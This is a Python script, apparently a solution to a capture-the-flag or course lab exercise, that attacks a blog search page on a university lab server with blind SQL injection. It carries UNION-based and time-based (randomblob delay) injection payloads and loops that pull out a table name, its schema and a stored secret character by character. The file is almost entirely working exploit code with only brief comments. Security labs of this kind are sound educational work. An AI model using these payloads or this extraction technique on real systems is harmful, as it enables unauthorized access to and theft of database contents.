import requests
import string

SERVER = 'http://mustard.stt.rnl.tecnico.ulisboa.pt:22262'

# Start session
session = requests.session()
r = session.get(SERVER)

## first to get table name
def get_table_name():
    all_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_"
    table_name = 's'
    #while that repeats until the table name is found
    #keeps on sending requests to the server with new characters to see if they are part of the name
    while True:
        for char in all_chars:
            query = f"/?search=_' and title=1 UNION SELECT 1,tbl_name,1 FROM sqlite_master WHERE type='table' AND tbl_name LIKE '{table_name}{char}%' --"
            r = session.get(SERVER + query)
            
            if r.text.find("Found 0 articles") != -1:
                continue
            
            elif r.text.find("Found 0 articles") == -1:
                table_name += char
                print(table_name)
                all_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_"
                break


# here we know there is an element called secret
def get_table():
    table_name='super_s_sof_secrets'
    offset = 0
    content = ''
    all_chars = string.printable
    while True:
        for char in all_chars:
            query= f"nothing' OR ((SELECT hex(substr(sql,{len(content) + 1},1)) FROM sqlite_master WHERE type='table' and tbl_name ='{table_name}' limit 1 offset {offset}) = hex('{format(char)}') AND 1 = randomblob(100000000)) --"
            r = session.get(SERVER +"/?search=" + query)
            
            if r.elapsed.total_seconds() < 1.7:
                continue
            
            else:
                print(r.elapsed.total_seconds())
                print("seconds...")
                content += char
                print("current:" + content)
                break
            

def get_secret():
    table_name='super_s_sof_secrets'
    offset = 0
    content = ''
    all_chars = string.printable
    while True:
        for char in all_chars:
            query= f"nothing' OR ((SELECT hex(substr(secret,{len(content) + 1},1)) FROM {table_name} limit 1 offset {offset}) = hex('{format(char)}') AND 1 = randomblob(100000000)) --"
            r = session.get(SERVER +"/?search=" + query)
            
            if r.elapsed.total_seconds() < 1.7:
                continue
            
            else:
                print(r.elapsed.total_seconds())
                print("seconds...")
                content += char
                print("current:" + content)
                break

# We know there are multiple tables, user, blog_post and one more
#get_table_name()

# Although we have the name we dont know what else the table has
#get_table()

# Now that we know its contents and what to attack we will get the secret content
get_secret()
